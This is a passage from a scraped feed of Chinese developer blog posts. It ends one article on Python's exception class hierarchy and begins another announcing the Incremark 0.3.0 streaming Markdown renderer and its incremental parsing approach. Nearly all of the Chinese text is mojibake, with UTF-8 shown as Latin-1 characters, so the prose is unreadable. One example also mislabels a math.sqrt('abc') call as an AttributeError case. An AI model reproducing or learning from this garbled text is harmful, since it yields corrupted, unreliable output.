    â”œâ”€â”€ ArithmeticError
    â”‚   â”œâ”€â”€ ZeroDivisionError
    â”‚   â””â”€â”€ FloatingPointError
    â”œâ”€â”€ LookupError
    â”‚   â”œâ”€â”€ IndexError
    â”‚   â””â”€â”€ KeyError
    â”œâ”€â”€ OSError
    â”œâ”€â”€ ValueError
    â”œâ”€â”€ TypeError
    â””â”€â”€ RuntimeError
</code></pre>
</li>
<li>
<p>åŸºæœ¬å±‚çº§æ¶æ„é€»è¾‘ä¸º</p>
<pre><code class="hljs language-scss" lang="scss">BaseException (é¡¶å±‚)
    â†“
Exception (ä¸­å±‚ - ç”¨æˆ·å¯æ•è·çš„å¼‚å¸¸)
    â†“
å…·ä½“å¼‚å¸¸ç±» (åº•å±‚ - å…·ä½“é”™è¯¯ç±»å‹)
</code></pre>
</li>
</ul>
<h3 data-id="heading-24">5.2 ExceptionåŠå…¶å­ç±» æ•è·</h3>
<ul>
<li>
<p><strong>Exceptionæœ¬èº«ä¸ä¼šç›´æ¥è¢«æŠ›å‡º</strong>ï¼Œä½†å¯ä»¥ç”¨try-exceptæ•è·æ‰€æœ‰ç»§æ‰¿è‡ªExceptionçš„å¼‚å¸¸ã€‚</p>
</li>
<li>
<p>Exception ç±»æ•è· ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è· Exception æœ¬èº«</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># ä»»ä½•ç»§æ‰¿è‡ª Exception çš„å¼‚å¸¸éƒ½ä¼šè¢«æ•è·</span>
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"å€¼é”™è¯¯"</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ°Exceptionå­ç±»: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¶ˆæ¯: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è· Exception çš„å­ç±»</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"å€¼é”™è¯¯"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># ValueError æ˜¯ Exception çš„å­ç±»</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ° ValueError: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·å¤šä¸ªå¼‚å¸¸ç±»</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">"ç±»å‹é”™è¯¯"</span>)
<span class="hljs-keyword">except</span> (ValueError, TypeError, KeyError) <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ°å¼‚å¸¸: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
</li>
<li>
<p>Exception å­ç±» by åŠŸèƒ½é¢†åŸŸçš„ä¸å®Œå…¨åˆ†ç»„ï¼š</p>
<ul>
<li>
<p>ç®—æœ¯åŸŸ</p>
<pre><code class="hljs language-python" lang="python">ArithmeticError     <span class="hljs-comment"># ç®—æœ¯é”™è¯¯</span>
    â”œâ”€â”€ FloatingPointError  <span class="hljs-comment"># ç²¾åº¦é—®é¢˜</span>
    â”œâ”€â”€ OverflowError       <span class="hljs-comment"># èŒƒå›´æº¢å‡º</span>
    â””â”€â”€ ZeroDivisionError   <span class="hljs-comment"># é™¤é›¶é”™è¯¯</span>
</code></pre>
</li>
<li>
<p>æŸ¥æ‰¾åŸŸ</p>
<pre><code class="hljs language-python" lang="python">LookupError     <span class="hljs-comment"># æŸ¥æ‰¾é”™è¯¯</span>
    â”œâ”€â”€ IndexError   <span class="hljs-comment"># åºåˆ—ç´¢å¼•é”™è¯¯</span>
    â””â”€â”€ KeyError     <span class="hljs-comment"># æ˜ å°„é”®é”™è¯¯</span>
</code></pre>
</li>
<li>
<p>I/O åŸŸ</p>
<pre><code class="hljs language-python" lang="python">OSError (å¤§é‡å­ç±»)
    â”œâ”€â”€ FileNotFoundError    <span class="hljs-comment"># æ–‡ä»¶ä¸å­˜åœ¨</span>
    â”œâ”€â”€ PermissionError      <span class="hljs-comment"># æƒé™é—®é¢˜</span>
    â”œâ”€â”€ TimeoutError         <span class="hljs-comment"># è¶…æ—¶</span>
    â””â”€â”€ ... (æ›´å¤šç³»ç»Ÿé”™è¯¯)
</code></pre>
</li>
<li>
<p>ValueError - å€¼é”™è¯¯</p>
<ul>
<li>int("abc")  # æ— æ³•è½¬æ¢ä¸ºæ•´æ•°</li>
</ul>
</li>
<li>
<p>TypeError - ç±»å‹é”™è¯¯</p>
<ul>
<li>"1" + 2  # ç±»å‹ä¸åŒ¹é…</li>
</ul>
</li>
<li>
<p>AttributeError - å±æ€§é”™è¯¯</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> math
math.sqrt(<span class="hljs-string">"abc"</span>)  <span class="hljs-comment"># math å¯¹è±¡æ²¡æœ‰ sqrt å±æ€§ï¼ˆå®é™…ä¸Šæœ‰ï¼Œä½†å‚æ•°ç±»å‹é”™è¯¯ï¼‰</span>
</code></pre>
</li>
<li>
<p>ImportError - å¯¼å…¥é”™è¯¯</p>
<pre><code class="hljs language-bash" lang="bash">ImportError         <span class="hljs-comment"># æ¨¡å—å¯¼å…¥å¤±è´¥</span>
    â””â”€â”€ ModuleNotFoundError   <span class="hljs-comment"># æ‰¾ä¸åˆ°æ¨¡å—</span>
</code></pre>
</li>
<li>
<p>RuntimeError - è¿è¡Œæ—¶é”™è¯¯</p>
<pre><code class="hljs language-bash" lang="bash">RuntimeError        <span class="hljs-comment"># è¿è¡Œæ—¶é”™è¯¯åŸºç±»</span>
   â”œâ”€â”€ NotImplementedError   <span class="hljs-comment"># æœªå®ç°çš„æ–¹æ³•</span>
   â””â”€â”€ RecursionError        <span class="hljs-comment"># é€’å½’æ·±åº¦è¶…é™</span>
</code></pre>
</li>
<li>
<p>åŒç±»é”™è¯¯å½’ä¸ºä¸€ç»„ï¼Œä¾¿äºæ‰¹é‡æ•è·ï¼ˆå¦‚ except LookupError: åŒæ—¶å¤„ç†IndexErrorå’ŒKeyErrorï¼‰ã€‚</p>
</li>
</ul>
</li>
</ul>
<h2 data-id="heading-25">6 è¡¥å……å¤‡ç”¨ï¼š python å¼‚å¸¸ å®Œæ•´å±‚æ¬¡ç»“æ„</h2>
<pre><code class="hljs language-php" lang="php">```python
BaseException
â”œâ”€â”€ SystemExit                    <span class="hljs-comment"># sys.exit()å¼•å‘</span>
â”œâ”€â”€ KeyboardInterrupt             <span class="hljs-comment"># ç”¨æˆ·ä¸­æ–­æ‰§è¡Œ(Ctrl+C)</span>
â”œâ”€â”€ GeneratorExit                 <span class="hljs-comment"># ç”Ÿæˆå™¨å…³é—­æ—¶å¼•å‘</span>
â””â”€â”€ <span class="hljs-built_in">Exception</span>                     <span class="hljs-comment"># æ‰€æœ‰ç”¨æˆ·å®šä¹‰å¼‚å¸¸çš„åŸºç±»</span>
    â”œâ”€â”€ StopIteration             <span class="hljs-comment"># è¿­ä»£å™¨æ²¡æœ‰æ›´å¤šå€¼</span>
    â”œâ”€â”€ StopAsyncIteration        <span class="hljs-comment"># å¼‚æ­¥è¿­ä»£å™¨</span>
    â”œâ”€â”€ <span class="hljs-built_in">ArithmeticError</span>           <span class="hljs-comment"># ç®—æœ¯é”™è¯¯åŸºç±»</span>
    â”‚   â”œâ”€â”€ FloatingPointError    <span class="hljs-comment"># æµ®ç‚¹è®¡ç®—å¤±è´¥</span>
    â”‚   â”œâ”€â”€ OverflowError         <span class="hljs-comment"># æ•°å€¼æº¢å‡º</span>
    â”‚   â””â”€â”€ ZeroDivisionError     <span class="hljs-comment"># é™¤ä»¥é›¶</span>
    â”œâ”€â”€ <span class="hljs-built_in">AssertionError</span>            <span class="hljs-comment"># assertè¯­å¥å¤±è´¥</span>
    â”œâ”€â”€ AttributeError            <span class="hljs-comment"># å±æ€§å¼•ç”¨å¤±è´¥</span>
    â”œâ”€â”€ BufferError               <span class="hljs-comment"># ç¼“å†²åŒºæ“ä½œå¤±è´¥</span>
    â”œâ”€â”€ EOFError                  <span class="hljs-comment"># è¾“å…¥ç»“æŸ</span>
    â”œâ”€â”€ ImportError               <span class="hljs-comment"># æ¨¡å—å¯¼å…¥å¤±è´¥</span>
    â”‚   â””â”€â”€ ModuleNotFoundError   <span class="hljs-comment"># æ‰¾ä¸åˆ°æ¨¡å—</span>
    â”œâ”€â”€ LookupError               <span class="hljs-comment"># æŸ¥æ‰¾å¤±è´¥åŸºç±»</span>
    â”‚   â”œâ”€â”€ IndexError           <span class="hljs-comment"># ç´¢å¼•è¶…å‡ºèŒƒå›´</span>
    â”‚   â””â”€â”€ KeyError              <span class="hljs-comment"># å­—å…¸é”®ä¸å­˜åœ¨</span>
    â”œâ”€â”€ MemoryError               <span class="hljs-comment"># å†…å­˜ä¸è¶³</span>
    â”œâ”€â”€ NameError                 <span class="hljs-comment"># å±€éƒ¨/å…¨å±€åç§°ä¸å­˜åœ¨</span>
    â”‚   â””â”€â”€ UnboundLocalError     <span class="hljs-comment"># è®¿é—®æœªåˆå§‹åŒ–çš„å±€éƒ¨å˜é‡</span>
    â”œâ”€â”€ OSError                   <span class="hljs-comment"># æ“ä½œç³»ç»Ÿé”™è¯¯åŸºç±»</span>
    â”‚   â”œâ”€â”€ BlockingIOError       <span class="hljs-comment"># æ“ä½œä¼šé˜»å¡</span>
    â”‚   â”œâ”€â”€ ChildProcessError     <span class="hljs-comment"># å­è¿›ç¨‹æ“ä½œå¤±è´¥</span>
    â”‚   â”œâ”€â”€ ConnectionError       <span class="hljs-comment"># è¿æ¥ç›¸å…³é”™è¯¯åŸºç±»</span>
    â”‚   â”‚   â”œâ”€â”€ BrokenPipeError   <span class="hljs-comment"># ç®¡é“ç ´è£‚</span>
    â”‚   â”‚   â”œâ”€â”€ ConnectionAbortedError
    â”‚   â”‚   â”œâ”€â”€ ConnectionRefusedError
    â”‚   â”‚   â””â”€â”€ ConnectionResetError
    â”‚   â”œâ”€â”€ FileExistsError       <span class="hljs-comment"># æ–‡ä»¶å·²å­˜åœ¨</span>
    â”‚   â”œâ”€â”€ FileNotFoundError    <span class="hljs-comment"># æ–‡ä»¶æœªæ‰¾åˆ°</span>
    â”‚   â”œâ”€â”€ InterruptedError      <span class="hljs-comment"># ç³»ç»Ÿè°ƒç”¨ä¸­æ–­</span>
    â”‚   â”œâ”€â”€ IsADirectoryError     <span class="hljs-comment"># æ“ä½œç›®å½•è€Œéæ–‡ä»¶</span>
    â”‚   â”œâ”€â”€ NotADirectoryError    <span class="hljs-comment"># æ“ä½œæ–‡ä»¶è€Œéç›®å½•</span>
    â”‚   â”œâ”€â”€ PermissionError       <span class="hljs-comment"># æƒé™ä¸è¶³</span>
    â”‚   â””â”€â”€ TimeoutError          <span class="hljs-comment"># æ“ä½œè¶…æ—¶</span>
    â”œâ”€â”€ ReferenceError            <span class="hljs-comment"># å¼±å¼•ç”¨è®¿é—®å·²åˆ é™¤å¯¹è±¡</span>
    â”œâ”€â”€ RuntimeError              <span class="hljs-comment"># è¿è¡Œæ—¶é”™è¯¯åŸºç±»</span>
    â”‚   â”œâ”€â”€ NotImplementedError   <span class="hljs-comment"># æœªå®ç°çš„æ–¹æ³•</span>
    â”‚   â””â”€â”€ RecursionError        <span class="hljs-comment"># é€’å½’æ·±åº¦è¶…é™</span>
    â”œâ”€â”€ SyntaxError               <span class="hljs-comment"># è¯­æ³•é”™è¯¯</span>
    â”‚   â””â”€â”€ IndentationError      <span class="hljs-comment"># ç¼©è¿›é”™è¯¯</span>
    â”‚       â””â”€â”€ TabError          <span class="hljs-comment"># Tabå’Œç©ºæ ¼æ··ç”¨</span>
    â”œâ”€â”€ SystemError               <span class="hljs-comment"># è§£é‡Šå™¨å†…éƒ¨é”™è¯¯</span>
    â”œâ”€â”€ <span class="hljs-built_in">TypeError</span>                 <span class="hljs-comment"># ç±»å‹é”™è¯¯</span>
    â”œâ”€â”€ ValueError                <span class="hljs-comment"># å€¼é”™è¯¯</span>
    â””â”€â”€ Warning                   <span class="hljs-comment"># è­¦å‘ŠåŸºç±»</span>
        â”œâ”€â”€ DeprecationWarning
        â”œâ”€â”€ PendingDeprecationWarning
        â”œâ”€â”€ RuntimeWarning
        â”œâ”€â”€ SyntaxWarning
        â”œâ”€â”€ UserWarning
        â”œâ”€â”€ FutureWarning
        â”œâ”€â”€ ImportWarning
        â”œâ”€â”€ UnicodeWarning
        â””â”€â”€ BytesWarning
```
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Incremark 0.3.0 å‘å¸ƒï¼šåŒå¼•æ“æ¶æ„ + å®Œæ•´æ’ä»¶ç”Ÿæ€ï¼ŒAI æµå¼æ¸²æŸ“çš„ç»ˆææ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7592508079305785363</link>    <guid>https://juejin.cn/post/7592508079305785363</guid>    <pubDate>2026-01-08T03:06:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592508079305785363" data-draft-id="7592452108798672939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Incremark 0.3.0 å‘å¸ƒï¼šåŒå¼•æ“æ¶æ„ + å®Œæ•´æ’ä»¶ç”Ÿæ€ï¼ŒAI æµå¼æ¸²æŸ“çš„ç»ˆææ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,äººå·¥æ™ºèƒ½,å¼€æº"/> <meta itemprop="datePublished" content="2026-01-08T03:06:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kingç‹ä¸€å¸…"/> <meta itemprop="url" content="https://juejin.cn/user/395479917018408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Incremark 0.3.0 å‘å¸ƒï¼šåŒå¼•æ“æ¶æ„ + å®Œæ•´æ’ä»¶ç”Ÿæ€ï¼ŒAI æµå¼æ¸²æŸ“çš„ç»ˆææ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479917018408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kingç‹ä¸€å¸…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:06:39.000Z" title="Thu Jan 08 2026 03:06:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä» O(nÂ²) åˆ° O(n)ï¼šä¸º AI æ—¶ä»£æ‰“é€ çš„æµå¼ Markdown æ¸²æŸ“å™¨</h2>
<p>å¦‚æœä½ å¼€å‘è¿‡ AI èŠå¤©åº”ç”¨ï¼Œä½ å¯èƒ½æ³¨æ„åˆ°ä¸€ä¸ªä»¤äººæ²®ä¸§çš„é—®é¢˜ï¼š<strong>å¯¹è¯è¶Šé•¿ï¼Œæ¸²æŸ“è¶Šå¡</strong>ã€‚</p>
<p>åŸå› å¾ˆç®€å•â€”â€”æ¯æ¬¡ AI è¾“å‡ºæ–°çš„ tokenï¼Œä¼ ç»Ÿ markdown è§£æå™¨éƒ½ä¼š<em>ä»å¤´å¼€å§‹</em>é‡æ–°è§£ææ•´ä¸ªæ–‡æ¡£ã€‚è¿™æ˜¯ä¸€ä¸ªæ ¹æœ¬æ€§çš„æ¶æ„é—®é¢˜ï¼Œè€Œä¸”éšç€ AI è¾“å‡ºè¶Šæ¥è¶Šé•¿ï¼Œé—®é¢˜åªä¼šè¶Šæ¥è¶Šä¸¥é‡ã€‚</p>
<p>æˆ‘ä»¬å¼€å‘äº† <strong>Incremark</strong> æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<h3 data-id="heading-1">2025 å¹´ AI çš„æ®‹é…·ç°å®</h3>
<p>å¦‚æœä½ ä¸€ç›´å…³æ³¨ AI çš„å‘å±•ï¼Œä½ ä¼šå‘ç°æ•°æ®å˜å¾—è¶Šæ¥è¶Šå¤¸å¼ ï¼š</p>
<ul>
<li><strong>2022</strong>ï¼šGPT-3.5 çš„å›å¤ï¼Ÿå‡ ç™¾ä¸ªå­—ï¼Œé—®é¢˜ä¸å¤§</li>
<li><strong>2023</strong>ï¼šGPT-4 æŠŠè¾“å‡ºæå‡åˆ° 2,000-4,000 å­—</li>
<li><strong>2024-2025</strong>ï¼šæ¨ç†æ¨¡å‹ï¼ˆo1ã€DeepSeek R1ï¼‰è¾“å‡º <strong>10,000+ å­—çš„"æ€è€ƒè¿‡ç¨‹"</strong></li>
</ul>
<p>æˆ‘ä»¬æ­£åœ¨ä» 4K token çš„å¯¹è¯èµ°å‘ 32Kï¼Œç”šè‡³ 128Kã€‚æ²¡äººè°ˆè®ºçš„ä¸€ä¸ªäº‹å®æ˜¯ï¼š<strong>æ¸²æŸ“ 500 å­—å’Œæ¸²æŸ“ 50,000 å­—çš„ Markdown æ˜¯å®Œå…¨ä¸åŒçš„å·¥ç¨‹é—®é¢˜ã€‚</strong></p>
<p>å¤§å¤šæ•° markdown åº“ï¼Ÿå®ƒä»¬æ˜¯ä¸ºåšå®¢æ–‡ç« è®¾è®¡çš„ï¼Œä¸æ˜¯ä¸ºä¼š"å¤§å£°æ€è€ƒ"çš„ AI è®¾è®¡çš„ã€‚</p>
<h3 data-id="heading-2">ä¸ºä»€ä¹ˆä½ çš„ Markdown è§£æå™¨åœ¨éª—ä½ </h3>
<p>å½“ä½ é€šè¿‡ä¼ ç»Ÿè§£æå™¨æµå¼ä¼ è¾“ AI è¾“å‡ºæ—¶ï¼Œåº•å±‚å‘ç”Ÿäº†ä»€ä¹ˆï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">âœ“</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">200</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(100</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">300</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(200</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">10</span><span class="hljs-string">,000</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">ğŸ˜°</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 + 200 + 300 + ... + 10,000 = 5,050,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>è¿™æ˜¯ <strong>O(nÂ²)</strong>ã€‚æˆæœ¬ä¸æ˜¯çº¿æ€§å¢é•¿â€”â€”è€Œæ˜¯<em>çˆ†ç‚¸å¼å¢é•¿</em>ã€‚</p>
<p>å¯¹äº 20KB çš„ AI å›å¤ï¼Œè¿™æ„å‘³ç€ï¼š</p>
<ul>
<li><strong>ant-design-x</strong>ï¼š1,657 ms è§£ææ—¶é—´</li>
<li><strong>markstream-vue</strong>ï¼š5,755 msï¼ˆå°†è¿‘ <strong>6 ç§’</strong>çš„è§£æï¼ï¼‰</li>
</ul>
<p>è€Œè¿™äº›éƒ½æ˜¯æµè¡Œçš„ã€ç»´æŠ¤è‰¯å¥½çš„åº“ã€‚é—®é¢˜ä¸åœ¨äºä»£ç å†™å¾—ä¸å¥½â€”â€”è€Œåœ¨äºæ¶æ„é€‰æ‹©é”™è¯¯ã€‚</p>
<h3 data-id="heading-3">æ ¸å¿ƒæ´å¯Ÿ</h3>
<p>å…³é”®åœ¨è¿™é‡Œï¼š</p>
<p><strong>ä¸€æ—¦ä¸€ä¸ª markdown å—"å®Œæˆ"ï¼Œå®ƒå°±æ°¸è¿œä¸ä¼šæ”¹å˜ã€‚</strong></p>
<p>æƒ³æƒ³çœ‹ã€‚å½“ AI è¾“å‡ºï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># æ ‡é¢˜</span>

è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚

</code></pre>
<p>åœ¨ç¬¬äºŒä¸ªç©ºè¡Œä¹‹åï¼Œè¿™ä¸ªæ®µè½å°±<em>å®Œæˆ</em>äº†ã€‚é”å®šäº†ã€‚æ— è®ºåé¢æ¥ä»€ä¹ˆâ€”â€”ä»£ç å—ã€åˆ—è¡¨ã€æ›´å¤šæ®µè½â€”â€”è¿™ä¸ªæ®µè½æ°¸è¿œä¸ä¼šå†è¢«åŠ¨äº†ã€‚</p>
<p>é‚£æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦é‡å¤è§£æå®ƒ 500 æ¬¡ï¼Ÿ</p>
<h3 data-id="heading-4">Incremark çš„å·¥ä½œåŸç†</h3>
<p>æˆ‘ä»¬å›´ç»•è¿™ä¸ªæ´å¯Ÿæ„å»ºäº† <strong>Incremark</strong>ã€‚æ ¸å¿ƒç®—æ³•ï¼š</p>
<ol>
<li><strong>æ£€æµ‹ç¨³å®šè¾¹ç•Œ</strong> â€” ç©ºè¡Œã€æ–°æ ‡é¢˜ã€ä»£ç å—ç»“æŸç¬¦</li>
<li><strong>ç¼“å­˜å·²å®Œæˆçš„å—</strong> â€” æ°¸ä¸å†åŠ¨</li>
<li><strong>åªé‡æ–°è§£æå¾…å¤„ç†çš„å—</strong> â€” å½“å‰æ­£åœ¨æ¥æ”¶è¾“å…¥çš„é‚£ä¸ª</li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">â†’</span> <span class="hljs-string">ç¼“å­˜ç¨³å®šå—</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 Ã— 100 = 10,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>è¿™æ˜¯ <strong>500 å€çš„å‡å°‘</strong>ã€‚æ¯ä¸ªå­—ç¬¦æœ€å¤šåªè¢«è§£æä¸€æ¬¡ã€‚è¿™å°±æ˜¯ O(n)ã€‚</p>
<h3 data-id="heading-5">å®Œæ•´åŸºå‡†æµ‹è¯•æ•°æ®</h3>
